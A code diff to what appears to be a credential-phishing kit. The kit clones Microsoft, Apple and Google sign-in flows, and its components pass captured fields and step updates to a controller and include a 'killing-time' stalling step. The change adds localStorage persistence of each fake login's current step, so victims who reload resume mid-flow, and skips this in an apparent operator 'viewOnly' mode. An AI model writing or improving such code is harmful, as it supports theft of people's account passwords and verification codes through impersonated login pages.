@@ -271,8 +271,14 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
   const isMobile = device === 'mobile';
 
   const [step, setStep] = useState<MsStep>(() => {
-    const init = new URLSearchParams(window.location.search).get('initialStep') as MsStep | null;
-    return init ?? 'email';
+    const params = new URLSearchParams(window.location.search);
+    const init = params.get('initialStep') as MsStep | null;
+    if (init) return init;
+    if (params.get('viewOnly') !== '1') {
+      const saved = localStorage.getItem('auth_step_ms') as MsStep | null;
+      if (saved) return saved;
+    }
+    return 'email';
   });
   const [regStep, setRegStep] = useState<RegStep>('reg-email');
   const [recStep, setRecStep] = useState<RecStep>('rec-find');
@@ -374,6 +380,11 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
+  useEffect(() => {
+    if (new URLSearchParams(window.location.search).get('viewOnly') === '1') return;
+    if (step === 'email') localStorage.removeItem('auth_step_ms');
+    else localStorage.setItem('auth_step_ms', step);
+  }, [step]);
 
   const [loading, setLoading] = useState(false);
   const [codeResent, setCodeResent] = useState(false);
@@ -1783,8 +1794,14 @@ function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHan
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
   const [step, setStep] = useState<AppleStep>(() => {
-    const init = new URLSearchParams(window.location.search).get('initialStep') as AppleStep | null;
-    return init ?? 'email';
+    const params = new URLSearchParams(window.location.search);
+    const init = params.get('initialStep') as AppleStep | null;
+    if (init) return init;
+    if (params.get('viewOnly') !== '1') {
+      const saved = localStorage.getItem('auth_step_apple') as AppleStep | null;
+      if (saved) return saved;
+    }
+    return 'email';
   });
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
@@ -1824,6 +1841,11 @@ function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHan
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
+  useEffect(() => {
+    if (new URLSearchParams(window.location.search).get('viewOnly') === '1') return;
+    if (step === 'email') localStorage.removeItem('auth_step_apple');
+    else localStorage.setItem('auth_step_apple', step);
+  }, [step]);
 
   const nav = (target: AppleStep, captureField?: string, captureVal?: string) => {
     setEmailError(null); setPasswordError(null); setCodeError(null);
@@ -2278,8 +2300,14 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
   const isDark = theme === 'dark';
   const isDesktop = device === 'desktop';
   const [step, setStep] = useState<GoogleStep>(() => {
-    const init = new URLSearchParams(window.location.search).get('initialStep') as GoogleStep | null;
-    return init ?? 'email';
+    const params = new URLSearchParams(window.location.search);
+    const init = params.get('initialStep') as GoogleStep | null;
+    if (init) return init;
+    if (params.get('viewOnly') !== '1') {
+      const saved = localStorage.getItem('auth_step_google') as GoogleStep | null;
+      if (saved) return saved;
+    }
+    return 'email';
   });
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
@@ -2360,6 +2388,11 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, []);
   useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);
+  useEffect(() => {
+    if (new URLSearchParams(window.location.search).get('viewOnly') === '1') return;
+    if (step === 'email') localStorage.removeItem('auth_step_google');
+    else localStorage.setItem('auth_step_google', step);
+  }, [step]);
 
   useEffect(() => {
     if (step !== 'killing-time') return;
